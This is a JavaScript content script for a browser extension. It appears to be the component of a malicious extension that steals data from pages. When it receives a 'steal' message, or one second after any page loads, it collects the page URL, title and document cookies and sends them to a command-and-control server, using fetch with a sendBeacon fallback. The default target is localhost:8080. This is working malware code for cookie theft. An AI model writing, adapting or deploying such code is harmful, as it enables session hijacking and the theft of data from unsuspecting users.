(function() {

  if (window.location.protocol.startsWith('chrome')) {
    console.log('Privileged page - content script inactive');
    return;
  }
  
  console.log('[CONTENT] Loaded in:', window.location.href);

  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.action === 'steal') {
      stealPageData(msg.c2);
    }
  });
  
  function stealPageData(c2Url) {
    console.log('Stealing page data...');
    
    const data = {
      url: window.location.href,
      title: document.title,
      cookies: document.cookie || '',
      time: Date.now()
    };

    fetch(`${c2Url}/api/page`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    }).then(() => {
      console.log('Page data sent');
    }).catch(e => {
      console.log('Fetch failed, using beacon:', e);
      navigator.sendBeacon(`${c2Url}/api/page`, JSON.stringify(data));
    });
  }

  if (document.readyState === 'complete') {
    setTimeout(() => stealPageData('http://localhost:8080'), 1000);
  } else {
    window.addEventListener('load', () => {
      setTimeout(() => stealPageData('http://localhost:8080'), 1000);
    });
  }
})();